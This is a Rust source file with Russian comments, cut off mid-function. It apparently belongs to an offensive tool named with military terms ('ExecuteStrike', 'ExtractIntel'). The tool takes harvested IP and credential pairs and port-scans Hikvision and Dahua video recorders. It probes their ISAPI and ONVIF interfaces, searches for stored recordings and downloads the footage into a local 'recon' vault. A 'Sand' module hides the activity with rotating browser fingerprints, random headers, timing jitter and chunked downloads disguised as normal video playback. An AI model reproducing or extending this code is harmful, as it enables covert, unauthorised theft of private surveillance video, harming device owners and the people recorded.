use tokio::sync::mpsc;
use std::time::{Duration, Instant};
use regex::Regex;
use chrono::Utc;

// =============================================================================
// 0. ⏳ МОДУЛЬ «ПЕСОК» (Sand Engine)
// Генератор шума: ломает сигнатуры автоматизации на каждом уровне.
// =============================================================================

/// Псевдослучайный генератор (xorshift64) — без зависимости от `rand` crate.
/// Детерминированный, лёгкий, достаточно для jitter-целей.
struct SandRng {
    state: u64,
}

impl SandRng {
    fn new() -> Self {
        // Сид из текущего времени в наносекундах
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        Self { state: seed ^ 0xDEAD_BEEF_CAFE_BABE }
    }

    fn next_u64(&mut self) -> u64 {
        let mut x = self.state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.state = x;
        x
    }

    /// Случайное число в диапазоне [lo, hi)
    fn range(&mut self, lo: u64, hi: u64) -> u64 {
        if hi <= lo { return lo; }
        lo + (self.next_u64() % (hi - lo))
    }

    /// Случайный элемент из среза
    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        let idx = self.range(0, items.len() as u64) as usize;
        &items[idx]
    }
}

/// Профиль «Песка» — конфигурация маскировки для одной операции
#[derive(Debug, Clone)]
struct SandProfile {
    /// Диапазон размера чанков в байтах [min, max)
    chunk_min: u64,
    chunk_max: u64,
    /// Диапазон пауз между чанками в мс [min, max)
    delay_min_ms: u64,
    delay_max_ms: u64,
    /// Диапазон пауз между API-запросами (разведка, поиск)
    api_delay_min_ms: u64,
    api_delay_max_ms: u64,
    /// Диапазон пауз между задачами скачивания
    task_delay_min_ms: u64,
    task_delay_max_ms: u64,
}

impl SandProfile {
    /// Стандартный профиль: имитация пользователя, перематывающего архив
    fn standard() -> Self {
        Self {
            chunk_min: 512 * 1024,       // 512 KB
            chunk_max: 2 * 1024 * 1024,  // 2 MB
            delay_min_ms: 120,
            delay_max_ms: 600,
            api_delay_min_ms: 200,
            api_delay_max_ms: 800,
            task_delay_min_ms: 1500,
            task_delay_max_ms: 4000,
        }
    }

    /// Агрессивный профиль: быстрее, но менее скрытно
    fn aggressive() -> Self {
        Self {
            chunk_min: 1024 * 1024,       // 1 MB
            chunk_max: 4 * 1024 * 1024,   // 4 MB
            delay_min_ms: 50,
            delay_max_ms: 200,
            api_delay_min_ms: 100,
            api_delay_max_ms: 300,
            task_delay_min_ms: 500,
            task_delay_max_ms: 1500,
        }
    }

    /// Параноидный профиль: максимальная скрытность
    fn stealth() -> Self {
        Self {
            chunk_min: 256 * 1024,       // 256 KB
            chunk_max: 1024 * 1024,      // 1 MB
            delay_min_ms: 300,
            delay_max_ms: 1200,
            api_delay_min_ms: 500,
            api_delay_max_ms: 2000,
            task_delay_min_ms: 3000,
            task_delay_max_ms: 8000,
        }
    }
}

/// Пул User-Agent строк для ротации (Fingerprint Morphing)
const UA_POOL: &[&str] = &[
    // Desktop Chrome (разные версии + ОС)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    // Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    // Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    // Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    // Mobile (имитация просмотра с телефона)
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    // Экзотика (умный телевизор, Tizen)
    "Mozilla/5.0 (SMART-TV; LINUX; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/85.0.4183.93 TV Safari/537.36",
];

const ACCEPT_LANG_POOL: &[&str] = &[
    "en-US,en;q=0.9",
    "ru-RU,ru;q=0.9,en-US;q=0.8",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.7",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "uk-UA,uk;q=0.9,en;q=0.7",
];

/// Построить HTTP-клиент с уникальным отпечатком для этой сессии
fn build_sand_client(rng: &mut SandRng, timeout_secs: u64) -> Result<reqwest::Client, String> {
    let ua = rng.pick(UA_POOL);
    reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout_secs))
        .danger_accept_invalid_certs(true)
        .user_agent(*ua)
        .build()
        .map_err(|e| e.to_string())
}

/// Добавить «шумовые» заголовки к запросу — ломаем отпечаток сессии
fn apply_sand_headers(rng: &mut SandRng, req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    let lang = rng.pick(ACCEPT_LANG_POOL);
    let accept = match rng.range(0, 3) {
        0 => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        1 => "*/*",
        _ => "video/mp4,video/*;q=0.9,*/*;q=0.5",
    };
    req.header("Accept-Language", *lang)
       .header("Accept", accept)
       .header("Cache-Control", "no-cache")
       .header("DNT", "1")
}

/// Пауза с jitter — «песок в шестернях»
async fn sand_sleep(rng: &mut SandRng, min_ms: u64, max_ms: u64, tx: &mpsc::Sender<HyperionEvent>, label: &str) {
    let ms = rng.range(min_ms, max_ms);
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("⏳ [SAND] {} — пауза {}ms", label, ms),
    }).await;
    tokio::time::sleep(Duration::from_millis(ms)).await;
}


// =============================================================================
// 1. ПРОТОКОЛ СВЯЗИ (Язык Генштаба)
// =============================================================================
#[derive(Debug, Clone)]
pub enum HyperionEvent {
    TargetDiscovered { ip: String, port: u16, login: String, pass: String },
    AnalyzeTarget { ip: String, port: u16, login: String, pass: String },
    TargetAnalyzed {
        ip: String,
        port: u16,
        login: String,
        pass: String,
        vendor: NvrVendor,
        open_ports: Vec<u16>,
        isapi_endpoint: Option<String>,
        onvif_endpoint: Option<String>,
        device_model: Option<String>,
    },
    ExecuteStrike {
        ip: String,
        port: u16,
        login: String,
        pass: String,
        vendor: NvrVendor,
        isapi_endpoint: Option<String>,
        onvif_endpoint: Option<String>,
    },
    ExtractIntel {
        ip: String,
        login: String,
        pass: String,
        vendor: NvrVendor,
        isapi_recordings: Vec<IsapiHit>,
        onvif_recordings: Vec<OnvifHit>,
    },
    TransportCargo {
        ip: String,
        login: String,
        pass: String,
        download_tasks: Vec<DownloadTask>,
    },
    OperationComplete { ip: String, result: String },
    OperationFailed { ip: String, reason: String },
    NexusLog { message: String },
}

#[derive(Debug, Clone, PartialEq)]
pub enum NvrVendor { Hikvision, Dahua, Unknown }

impl std::fmt::Display for NvrVendor {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            NvrVendor::Hikvision => write!(f, "Hikvision"),
            NvrVendor::Dahua => write!(f, "Dahua"),
            NvrVendor::Unknown => write!(f, "Unknown"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct IsapiHit {
    pub endpoint: String,
    pub track_id: Option<String>,
    pub start_time: Option<String>,
    pub end_time: Option<String>,
    pub playback_uri: Option<String>,
}

#[derive(Debug, Clone)]
pub struct OnvifHit {
    pub endpoint: String,
    pub token: String,
}

#[derive(Debug, Clone)]
pub enum DownloadTask {
    IsapiPlayback { playback_uri: String, login: String, pass: String, filename_hint: String },
    OnvifToken { endpoint: String, recording_token: String, login: String, pass: String, filename_hint: String },
    RtspCapture { source_url: String, filename_hint: String, duration_seconds: u64 },
}


// =============================================================================
// 2. STANDALONE ОПЕРАЦИИ С ПЕСКОМ
// =============================================================================

fn normalize_host(input: &str) -> String {
    input.trim()
        .trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("rtsp://")
        .split('/').next().unwrap_or_default()
        .split(':').next().unwrap_or_default()
        .to_string()
}

fn get_vault_path() -> std::path::PathBuf {
    let path = std::path::PathBuf::from(r"D:\Nemesis_Vault\recon_db");
    if !path.exists() { let _ = std::fs::create_dir_all(&path); }
    path
}

fn sanitize_filename(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() || ch == '.' || ch == '_' || ch == '-' { out.push(ch); }
        else { out.push('_'); }
    }
    let trimmed = out.trim_matches('_');
    if trimmed.is_empty() { "recording".into() } else { trimmed.to_string() }
}

fn extract_xml_value(xml: &str, tag: &str) -> Option<String> {
    let pattern = format!("<{}[^>]*>([^<]+)</{}>", tag, tag);
    Regex::new(&pattern).ok()
        .and_then(|re| re.captures(xml).and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string())))
}


// --- BRAIN: сканирование портов с jitter между пробами ---

async fn scan_ports(host: &str, tx: &mpsc::Sender<HyperionEvent>) -> Vec<u16> {
    let ports = [21u16, 22, 80, 443, 554, 2019, 8080, 8443];
    let mut open = Vec::new();
    let mut rng = SandRng::new();

    for port in ports {
        let addr = format!("{}:{}", host, port);
        if tokio::time::timeout(Duration::from_millis(900), tokio::net::TcpStream::connect(&addr))
            .await.is_ok_and(|v| v.is_ok())
        {
            open.push(port);
        }
        // Песок: микро-пауза между пробами портов (30-90ms)
        let jitter = rng.range(30, 90);
        tokio::time::sleep(Duration::from_millis(jitter)).await;
    }
    open
}


// --- BRAIN: ISAPI probe с ротацией отпечатка ---

async fn probe_isapi(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = build_sand_client(&mut rng, 6).ok()?;

    let candidates = vec![
        format!("http://{}:80/ISAPI/System/deviceInfo", host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", host),
        format!("http://{}:2019/ISAPI/System/deviceInfo", host),
        format!("https://{}:443/ISAPI/System/deviceInfo", host),
        format!("https://{}:8443/ISAPI/System/deviceInfo", host),
    ];

    for ep in candidates {
        let req = client.get(&ep).basic_auth(login, Some(pass));
        let req = apply_sand_headers(&mut rng, req);
        if let Ok(resp) = req.send().await {
            if resp.status().is_success() || resp.status().as_u16() == 401 {
                return Some(ep);
            }
        }
        // Песок между пробами
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ISAPI probe").await;
    }
    None
}


// --- BRAIN: ONVIF probe с ротацией ---

async fn probe_onvif(host: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = build_sand_client(&mut rng, 6).ok()?;

    let candidates = vec![
        format!("http://{}:80/onvif/device_service", host),
        format!("http://{}:8080/onvif/device_service", host),
        format!("http://{}:2019/onvif/device_service", host),
        format!("https://{}:443/onvif/device_service", host),
        format!("https://{}:8443/onvif/device_service", host),
    ];

    for ep in candidates {
        let req = client.get(&ep);
        let req = apply_sand_headers(&mut rng, req);
        if let Ok(resp) = req.send().await {
            if resp.status().is_success() || resp.status().as_u16() == 401 {
                return Some(ep);
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF probe").await;
    }
    None
}


// --- BRAIN: DeviceInfo + определение вендора ---

async fn fetch_device_info(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> (NvrVendor, Option<String>) {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = match build_sand_client(&mut rng, 8) { Ok(c) => c, Err(_) => return (NvrVendor::Unknown, None) };

    // ISAPI deviceInfo
    for url in &[
        format!("http://{}:80/ISAPI/System/deviceInfo", host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", host),
        format!("http://{}:2019/ISAPI/System/deviceInfo", host),
        format!("https://{}:443/ISAPI/System/deviceInfo", host),
    ] {
        let req = client.get(url).basic_auth(login, Some(pass));
        let req = apply_sand_headers(&mut rng, req);
        if let Ok(resp) = req.send().await {
            if resp.status().is_success() {
                let text = resp.text().await.unwrap_or_default().to_lowercase();
                let model = extract_xml_value(&text, "model");
                if text.contains("hikvision") || text.contains("hikdigital") || text.contains("isapi") {
                    return (NvrVendor::Hikvision, model);
                }
                if text.contains("dahua") || text.contains("dh-") {
                    return (NvrVendor::Dahua, model);
                }
                return (NvrVendor::Hikvision, model);
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "deviceInfo").await;
    }

    // ONVIF GetDeviceInformation
    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body><tds:GetDeviceInformation/></s:Body>
</s:Envelope>"#;

    for url in &[
        format!("http://{}:80/onvif/device_service", host),
        format!("http://{}:8080/onvif/device_service", host),
        format!("http://{}:2019/onvif/device_service", host),
    ] {
        let req = client.post(url)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login, Some(pass))
            .body(soap.to_string());
        let req = apply_sand_headers(&mut rng, req);
        if let Ok(resp) = req.send().await {
            if resp.status().is_success() {
                let text = resp.text().await.unwrap_or_default().to_lowercase();
                let model = extract_xml_value(&text, "model");
                if text.contains("hikvision") { return (NvrVendor::Hikvision, model); }
                if text.contains("dahua") { return (NvrVendor::Dahua, model); }
                return (NvrVendor::Unknown, model);
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF info").await;
    }

    (NvrVendor::Unknown, None)
}


// --- SPETSNAZ: ISAPI поиск записей с песком ---

async fn search_isapi(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Vec<IsapiHit> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = match build_sand_client(&mut rng, 10) { Ok(c) => c, Err(_) => return vec![] };

    let body = r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription>
  <searchID>1</searchID>
  <trackList><trackID>101</trackID></trackList>
  <timeSpanList><timeSpan>
    <startTime>2024-01-01T00:00:00Z</startTime>
    <endTime>2027-12-31T23:59:59Z</endTime>
  </timeSpan></timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList>
</SearchDescription>"#;

    let candidates = vec![
        format!("http://{}:80/ISAPI/ContentMgmt/search", host),
        format!("http://{}:8080/ISAPI/ContentMgmt/search", host),
        format!("http://{}:2019/ISAPI/ContentMgmt/search", host),
        format!("https://{}:443/ISAPI/ContentMgmt/search", host),
        format!("https://{}:8443/ISAPI/ContentMgmt/search", host),
    ];

    let start_re = Regex::new(r"<startTime>([^<]+)</startTime>").unwrap();
    let end_re = Regex::new(r"<endTime>([^<]+)</endTime>").unwrap();
    let track_re = Regex::new(r"<trackID>([^<]+)</trackID>").unwrap();
    let uri_re = Regex::new(r"<playbackURI>([^<]+)</playbackURI>").unwrap();

    for endpoint in candidates {
        // Песок: пауза перед каждым endpoint
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ISAPI search").await;

        let req = client.post(&endpoint)
            .header("Content-Type", "application/xml")
            .basic_auth(login, Some(pass))
            .body(body.to_string());
        let req = apply_sand_headers(&mut rng, req);

        if let Ok(r) = req.send().await {
            if !r.status().is_success() { continue; }
            let text = r.text().await.unwrap_or_default();
            let starts: Vec<String> = start_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
            let ends: Vec<String> = end_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
            let tracks: Vec<String> = track_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
            let uris: Vec<String> = uri_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();

            let count = [starts.len(), ends.len(), tracks.len(), uris.len()].into_iter().max().unwrap_or(0).min(40);
            if count > 0 {
                return (0..count).map(|i| IsapiHit {
                    endpoint: endpoint.clone(),
                    track_id: tracks.get(i).cloned(),
                    start_time: starts.get(i).cloned(),
                    end_time: ends.get(i).cloned(),
                    playback_uri: uris.get(i).cloned(),
                }).collect();
            }
        }
    }
    vec![]
}


// --- SPETSNAZ: ONVIF поиск записей с песком ---

async fn search_onvif(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Vec<OnvifHit> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = match build_sand_client(&mut rng, 10) { Ok(c) => c, Err(_) => return vec![] };

    let endpoints = vec![
        format!("http://{}:80/onvif/recording_service", host),
        format!("http://{}:8080/onvif/recording_service", host),
        format!("http://{}:2019/onvif/recording_service", host),
        format!("https://{}:443/onvif/recording_service", host),
        format!("https://{}:8443/onvif/recording_service", host),
    ];

    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl">
  <s:Body><trc:GetRecordings/></s:Body>
</s:Envelope>"#;

    let token_re = Regex::new(r"<[^>]*RecordingToken[^>]*>([^<]+)</[^>]+>").unwrap();

    for endpoint in endpoints {
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF search").await;

        let req = client.post(&endpoint)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login, Some(pass))
            .body(soap.to_string());
        let req = apply_sand_headers(&mut rng, req);

        if let Ok(r) = req.send().await {
            if !r.status().is_success() && r.status().as_u16() != 401 { continue; }
            let text = r.text().await.unwrap_or_default();
            let out: Vec<OnvifHit> = token_re.captures_iter(&text)
                .filter_map(|c| c.get(1).map(|m| OnvifHit {
                    endpoint: endpoint.clone(),
                    token: m.as_str().trim().to_string(),
                })).collect();
            if !out.is_empty() { return out; }
        }
    }
    vec![]
}


// =============================================================================
// 3. TRANSPORT С ПЕСКОМ: Chunk Jittering + Range-Based Download
// =============================================================================

/// 🏗️ ISAPI скачивание с дроблением на фракции (Range-Based Chunk Jitter)
///
/// Вместо одного GET-запроса на весь файл, мы:
/// 1. HEAD-запросом узнаём размер
/// 2. Делим на неровные чанки (512KB-2MB, случайный размер каждый раз)
/// 3. Качаем каждый чанк отдельным GET + Range header
/// 4. Между чанками — пауза случайной длительности
/// 5. Каждый чанк идёт с разными Accept-Language/Accept заголовками
///
/// Для NVR-сервера это выглядит как пользователь, перематывающий видео в плеере.
async fn sand_download_isapi(
    playback_uri: &str, login: &str, pass: &str,
    filename_hint: &str, tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let task_key = format!("nexus_isapi_{}", Utc::now().timestamp_millis());

    // Уникальный клиент для этой сессии (свой User-Agent)
    let session_ua = rng.pick(UA_POOL).to_string();
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] Сессия {} | Отпечаток: {}",
            task_key, session_ua.chars().take(40).collect::<String>()),
    }).await;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30)) // Таймаут на чанк, не на весь файл
        .danger_accept_invalid_certs(true)
        .user_agent(&session_ua)
        .build()
        .map_err(|e| e.to_string())?;

    // Шаг 1: HEAD — узнаём размер файла
    let head_req = apply_sand_headers(&mut rng,
        client.head(playback_uri).basic_auth(login, Some(pass)));
    let head_resp = head_req.send().await;

    let total_size = match head_resp {
        Ok(r) if r.status().is_success() => {
            r.content_length().unwrap_or(0)
        }
        Ok(r) if r.status().as_u16() == 401 || r.status().as_u16() == 405 => {
            // HEAD не поддерживается или 401 — пробуем скачать целиком (fallback)
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("⚠️ [SAND] HEAD не поддерживается ({}), fallback на stream", r.status()),
            }).await;
            return sand_download_isapi_stream(playback_uri, login, pass, filename_hint, tx).await;
        }
        _ => {
            // Недоступен — fallback
            return sand_download_isapi_stream(playback_uri, login, pass, filename_hint, tx).await;
        }
    };

    if total_size == 0 {
        let _ = tx.send(HyperionEvent::NexusLog {
            message: "⚠️ [SAND] Content-Length=0, fallback на stream".into(),
        }).await;
        return sand_download_isapi_stream(playback_uri, login, pass, filename_hint, tx).await;
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] Размер цели: {} bytes ({:.1} MB). Начинаю дробление.",
            total_size, total_size as f64 / 1_048_576.0),
    }).await;

    // Подготовка файла
    let dir = get_vault_path().join("archives").join("nexus_isapi");
    let _ = std::fs::create_dir_all(&dir);
    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() { filename = format!("isapi_{}.mp4", Utc::now().timestamp()); }
    if !filename.contains('.') { filename.push_str(".mp4"); }
    let path = dir.join(&filename);

    let mut file = std::fs::OpenOptions::new()
        .create(true).write(true).truncate(true)
        .open(&path).map_err(|e| e.to_string())?;

    // Шаг 2: CHUNK JITTER — качаем фрагментами
    let mut current_byte: u64 = 0;
    let mut chunk_count = 0u32;
    let started = Instant::now();

    while current_byte < total_size {
        // Случайный размер чанка
        let chunk_size = rng.range(sand.chunk_min, sand.chunk_max);
        let end_byte = (current_byte + chunk_size - 1).min(total_size - 1);

        let range_header = format!("bytes={}-{}", current_byte, end_byte);

        // Каждый чанк — с немного разными заголовками
        let req = client.get(playback_uri)
            .basic_auth(login, Some(pass))
            .header("Range", &range_header);
        let req = apply_sand_headers(&mut rng, req);

        let chunk_start = Instant::now();
        let resp = req.send().await.map_err(|e| format!("chunk {} error: {}", chunk_count, e))?;

        let status = resp.status().as_u16();
        if status != 206 && status != 200 {
            // Если Range не поддерживается — fallback на stream
            if chunk_count == 0 {
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("⚠️ [SAND] Range не поддерживается (HTTP {}), fallback", status),
                }).await;
                let _ = std::fs::remove_file(&path);
                return sand_download_isapi_stream(playback_uri, login, pass, filename_hint, tx).await;
            }
            return Err(format!("chunk {} HTTP {}", chunk_count, status));
        }

        let data = resp.bytes().await.map_err(|e| e.to_string())?;
        let chunk_bytes = data.len() as u64;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;

        current_byte += chunk_bytes;
        chunk_count += 1;

        // Адаптивный расчёт скорости
        let chunk_ms = chunk_start.elapsed().as_millis() as u64;
        let speed_kbs = if chunk_ms > 0 { chunk_bytes / chunk_ms } else { 0 }; // KB/s (примерно)

        // Лог каждые 4 чанка — не спамим
        if chunk_count % 4 == 0 || current_byte >= total_size {
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!(
                    "🏖️ [SAND] chunk#{} | {:.1}/{:.1} MB ({:.0}%) | ~{}KB/s | range={}",
                    chunk_count,
                    current_byte as f64 / 1_048_576.0,
                    total_size as f64 / 1_048_576.0,
                    (current_byte as f64 / total_size as f64) * 100.0,
                    speed_kbs,
                    range_header,
                ),
            }).await;
        }

        // DOWNLOAD_PROGRESS для UI
        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, current_byte, total_size),
        }).await;

        // Песок: пауза между чанками
        if current_byte < total_size {
            // Адаптивная пауза: если сервер отвечает быстро — делаем паузу длиннее
            // (чтобы не выглядеть как бот, который качает на максимуме)
            let adaptive_bonus = if chunk_ms < 200 { rng.range(100, 300) } else { 0 };
            let pause = rng.range(sand.delay_min_ms, sand.delay_max_ms) + adaptive_bonus;
            tokio::time::sleep(Duration::from_millis(pause)).await;
        }
    }

    let elapsed = started.elapsed();
    let avg_speed = if elapsed.as_secs() > 0 {
        current_byte / elapsed.as_secs()
    } else {
        current_byte
    };

    let save_path = path.to_string_lossy().to_string();
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!(
            "🏖️ [SAND] ISAPI ЗАВЕРШЁН: {} | {} chunks | {:.1} MB | {:.1}s | avg {:.0} KB/s",
            filename, chunk_count, current_byte as f64 / 1_048_576.0,
            elapsed.as_secs_f64(), avg_speed as f64 / 1024.0,
        ),
    }).await;

    Ok(save_path)
}


/// Fallback: потоковое скачивание ISAPI когда Range не поддерживается.
/// Всё ещё с песком: jitter между записью блоков, ротация отпечатка.
async fn sand_download_isapi_stream(
    playback_uri: &str, login: &str, pass: &str,
    filename_hint: &str, tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    use futures_util::StreamExt;

    let mut rng = SandRng::new();
    let client = build_sand_client(&mut rng, 120)?;
    let task_key = format!("nexus_isapi_s_{}", Utc::now().timestamp_millis());

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🚚 [SAND-STREAM] fallback download: {}", playback_uri),
    }).await;

    let req = client.get(playback_uri).basic_auth(login, Some(pass));
    let req = apply_sand_headers(&mut rng, req);
    let resp = req.send().await.map_err(|e| e.to_string())?;
    if !resp.status().is_success() {
        return Err(format!("HTTP {}", resp.status().as_u16()));
    }

    let dir = get_vault_path().join("archives").join("nexus_isapi");
    let _ = std::fs::create_dir_all(&dir);
    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() { filename = format!("isapi_{}.mp4", Utc::now().timestamp()); }
    if !filename.contains('.') { filename.push_str(".mp4"); }
    let path = dir.join(&filename);

    let total = resp.content_length().unwrap_or(0);
    let mut stream = resp.bytes_stream();
    let mut file = std::fs::OpenOptions::new().create(true).write(true).truncate(true)
        .open(&path).map_err(|e| e.to_string())?;

    let mut written: u64 = 0;
    let mut next_mark: u64 = 2 * 1024 * 1024;
    let mut chunk_count = 0u32;

    while let Some(chunk) = stream.next().await {
        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        written += data.len() as u64;
        chunk_count += 1;

        if written >= next_mark {
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, written, total.max(written)),
            }).await;
            next_mark += 2 * 1024 * 1024;

            // Песок: микро-пауза каждые ~2MB (имитация буферизации)
            let pause = rng.range(80, 250);
            tokio::time::sleep(Duration::from_millis(pause)).await;
        }
    }

    let save_path = path.to_string_lossy().to_string();
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🚚 [SAND-STREAM] done: {} ({} bytes, {} chunks)", filename, written, chunk_count),
    }).await;
    Ok(save_path)
}


/// ONVIF скачивание: GetReplayUri → RTSP → ffmpeg (песок применяется к API-фазе)
async fn sand_download_onvif(
    endpoint: &str, recording_token: &str, login: &str, pass: &str,
    filename_hint: &str, tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = build_sand_client(&mut rng, 45)?;
    let task_key = format!("nexus_onvif_{}", Utc::now().timestamp_millis());

    let session_ua = rng.pick(UA_POOL).to_string();
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] ONVIF сессия | Отпечаток: {}",
            session_ua.chars().take(40).collect::<String>()),
    }).await;

    // Песок перед API-запросом
    sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "pre-GetReplayUri").await;

    // GetReplayUri
    let soap = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">
  <s:Body>
    <trp:GetReplayUri>
      <trp:StreamSetup><tt:Stream>RTP-Unicast</tt:Stream><tt:Transport><tt:Protocol>RTSP</tt:Protocol></tt:Transport></trp:StreamSetup>
      <trp:RecordingToken>{}</trp:RecordingToken>
    </trp:GetReplayUri>
  </s:Body>
</s:Envelope>"#, recording_token);

    let req = client.post(endpoint)
        .header("Content-Type", "application/soap+xml; charset=utf-8")
        .basic_auth(login, Some(pass))
        .body(soap);
    let req = apply_sand_headers(&mut rng, req);

    let replay_resp = req.send().await.map_err(|e| e.to_string())?;
    let replay_body = replay_resp.text().await.map_err(|e| e.to_string())?;
    let uri_re = Regex::new(r"<[^>]*Uri[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;
    let replay_uri = uri_re.captures(&replay_body)
        .and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string()))
        .ok_or_else(|| "ONVIF replay URI не найден".to_string())?;

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] ONVIF replay URI: {}", replay_uri),
    }).await;

    // Песок перед запуском ffmpeg
    sand_sleep(&mut rng, 500, 1500, tx, "pre-ffmpeg").await;

    // ffmpeg capture
    let dir = get_vault_path().join("archives").join("nexus_onvif");
    let _ = std::fs::create_dir_all(&dir);
    let mut filename = sanitize_filename(filename_hint);
